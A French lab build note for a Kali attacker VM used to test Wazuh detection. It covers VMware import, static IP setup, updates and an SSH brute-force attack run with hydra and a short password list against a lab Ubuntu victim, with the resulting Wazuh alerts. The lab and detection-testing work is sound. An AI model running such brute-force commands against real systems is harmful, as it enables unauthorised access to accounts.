# Construction — VM Kali (attaquant)

## Contexte
- Rôle : machine d'attaque du lab, utilisée pour générer les attaques et tester la détection Wazuh.
- Environnement : VMware Workstation Pro, réseau NAT VMnet8.
- Kali : image VMware pré-construite (kali-linux-2026.x), IP fixe 192.168.159.50 (`.30` est réservée à la VM elastic).

## Import de la VM
1. Télécharger l'image VMware (`.7z`) sur https://www.kali.org/get-kali/#kali-virtual-machines
2. Extraire, puis dans VMware : **Open a Virtual Machine** → sélectionner le `.vmx`
3. VM settings → Network Adapter → **NAT (VMnet8)**
4. Login par défaut `kali` / `kali` → changer le mot de passe (`passwd`)

## Configuration réseau (IP fixe)
```bash
nmcli connection show
sudo nmcli connection modify "Wired connection 1" \
  ipv4.addresses 192.168.159.50/24 \
  ipv4.gateway 192.168.159.2 \
  ipv4.dns 192.168.159.2 \
  ipv4.method manual
sudo nmcli connection down "Wired connection 1" && sudo nmcli connection up "Wired connection 1"
```

## Mise à jour
```bash
sudo apt update && sudo apt full-upgrade -y
```

## Attaque réalisée — bruteforce SSH
```bash
printf 'password\n123456\nadmin\nroot\ntoor\nletmein\nqwerty\nabc123\n' > /tmp/pw.txt
hydra -l admin -P /tmp/pw.txt ssh://192.168.159.20 -t 4 -V
```
- Cible : victime Ubuntu (192.168.159.20).
- Résultat côté Wazuh : natives **5712 / 5763** (niveau 10) escaladées en **100110 / 100120** (niveau 12, MITRE T1110) — cf. [`build-victime-ubuntu.md`](build-victime-ubuntu.md) et le [runbook du cas 1](../../runbooks/cas-01-bruteforce-ssh.md).

## Attaques rejouées depuis Kali
Brute force SSH (cas 1), brute force SMB (cas 2), scan nmap (cas 3), exfiltration DNS (cas 9) — voir [`runbooks/`](../../runbooks/).
